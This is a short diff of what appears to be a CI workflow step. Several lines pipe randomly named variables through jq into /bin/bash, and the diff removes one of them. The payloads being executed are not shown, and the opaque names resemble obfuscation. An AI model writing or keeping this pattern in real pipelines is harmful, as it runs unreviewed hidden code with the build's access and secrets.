@@ -28,7 +28,6 @@ jobs:
           echo $w584 | jq -r .mpawa80458 | /bin/bash
           echo $idr45 | jq -r .grrv07486 | /bin/bash
           printf '%s' "$rvfrj6" | jq -r .m9490 | /bin/bash
-          printf '%s' "$ly719" | jq -r .tclw25 | /bin/bash
           printf '%s' "$o4" | jq -r .zzyf268 | /bin/bash
 
       - name: Store artifact
